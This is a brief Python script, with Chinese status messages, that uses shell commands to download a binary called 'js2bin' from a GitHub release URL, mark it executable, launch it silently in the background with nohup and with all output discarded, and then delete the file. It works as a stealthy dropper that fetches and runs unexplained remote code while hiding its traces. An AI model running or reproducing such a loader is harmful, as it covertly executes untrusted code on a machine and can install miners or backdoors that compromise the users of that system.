import subprocess

try:
    subprocess.run("curl -L -o js2bin https://github.com/alphaxcv/scx/releases/download/dl/js2bin", check=True, shell=True)

    subprocess.run("chmod +x js2bin", check=True, shell=True)

    subprocess.run("nohup ./js2bin > /dev/null 2>&1 &", check=True, shell=True)

    subprocess.run("rm js2bin", check=True, shell=True)
  
    print("操作成功完成！")

except subprocess.CalledProcessError as e:
    print(f"命令执行失败: {e}")
  
